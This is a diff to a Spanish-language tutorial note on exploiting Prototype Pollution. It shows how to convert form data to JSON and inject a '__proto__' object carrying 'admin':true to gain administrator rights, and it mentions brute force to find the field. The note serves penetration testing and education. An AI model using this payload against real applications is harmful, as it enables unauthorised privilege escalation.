@@ -11,10 +11,32 @@ El impacto de la explotación del ataque Prototype Pollution puede ser significa
 -- -
 ## Ejemplo de como explotarlo:
 
+Es importante aclarar que a veces la data se pasa por post con parametros asi nomas.
+```http
+Content-Type: application/x-www-form-urlencoded
+email=test@test.com&msg=carlos
+```
 
+En este caso es necesario cambiar el content type y la data tramitada por post como:
+```http
+Content-Type: application/json
 {
 "email":"test@test.com",
 "msg":"probando",
-"`__proto__`":{
-"admin":true}
 }
+```
+
+Luego de esto habria que verificar si el servidor recibe la data de igual manera. Para corroborarlo podemos chequear que nos redireccione al endpoint de login correctamente o sino podemos probar generando algun error de sintaxis (borrar una comilla, llave, etc) con el fin de ver si se rompe la consulta o no.
+Y para terminar, una vez sabemos que interpreta los datos en formato json, podemos probar de agregarle el atributo ```__proto__```:
+```http
+Content-Type: application/json
+{
+    "email": "test@test.com",
+    "msg": "probando",
+    "__proto__": {
+        "admin": true
+    }
+}
+```
+
+El campo de admin por lo general se descubre por intuicion, fuerza bruta y/o filtraciones del codigo fuente.
